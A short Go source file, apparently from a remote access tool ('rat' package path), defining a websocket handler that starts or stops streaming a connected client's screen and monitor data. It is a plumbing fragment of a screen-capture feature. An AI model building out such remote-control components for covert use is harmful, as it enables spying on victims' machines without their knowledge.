package main

import (
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type ScreenUpdateMessage struct {
	Activate bool    `json:"active"`
	Scale    float32 `json:"scale"`
	Monitor  bool    `json:"monitor"`
	Handle_  int     `json:"handle"`
}

func (m ScreenUpdateMessage) Handle(ws *websocket.Conn, client *Client) error {
	stream := m.Activate

	if stream {
		err := sendMessage(ws, client, MonitorMessage(client.Monitors))

		if err != nil {
			return err
		}
	}

	client.Listeners[header.MonitorsHeader] = ws

	packet := ScreenPacket{
		Activate: stream,
		Scale:    m.Scale,
		Handle:   m.Handle_,
		Monitor:  m.Monitor,
	}
	client.Queue <- &packet

	if !client.Screen.Streaming {
		go ScreenStream(client, ws)
	}

	client.Screen.Streaming = stream

	return nil
}
